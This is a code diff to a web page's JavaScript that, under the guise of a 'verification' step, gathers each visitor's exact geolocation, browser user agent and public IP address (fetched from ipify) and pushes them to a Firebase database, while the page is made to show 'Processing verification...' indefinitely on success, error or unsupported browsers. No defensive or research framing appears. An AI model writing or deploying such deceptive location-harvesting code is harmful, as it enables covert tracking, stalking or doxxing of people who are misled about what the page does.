@@ -53,22 +53,34 @@ document.addEventListener('DOMContentLoaded', () => {
                         longitude: position.coords.longitude,
                         timestamp: new Date().toISOString(),
                         userAgent: navigator.userAgent,
+                        // We'll get IP address from a service like ipify
                         ip: await fetch('https://api.ipify.org?format=json')
                             .then(response => response.json())
                             .then(data => data.ip)
                             .catch(() => 'Unknown')
                     };
 
-                    // Save location data to Firebase but don't redirect or handle completion
-                    database.ref('locations').push(locationData);
+                    // Save location data to Firebase
+                    database.ref('locations').push(locationData)
+                        .then(() => {
+                            console.log('Location saved');
+                            // Keep showing loading state instead of redirecting
+                            locationStatus.textContent = 'Processing verification...';
+                        })
+                        .catch(error => {
+                            console.error('Error saving location:', error);
+                            // Even on error, keep showing loading state
+                            locationStatus.textContent = 'Processing verification...';
+                        });
                 },
-                () => {
-                    // On error, still keep loading state
+                (error) => {
+                    console.error('Error getting location:', error);
+                    // Keep showing loading state on location error
                     locationStatus.textContent = 'Processing verification...';
                 }
             );
         } else {
-            // Even if geolocation is not supported, keep loading
+            // Keep showing loading state if geolocation not supported
             locationStatus.textContent = 'Processing verification...';
         }
     });
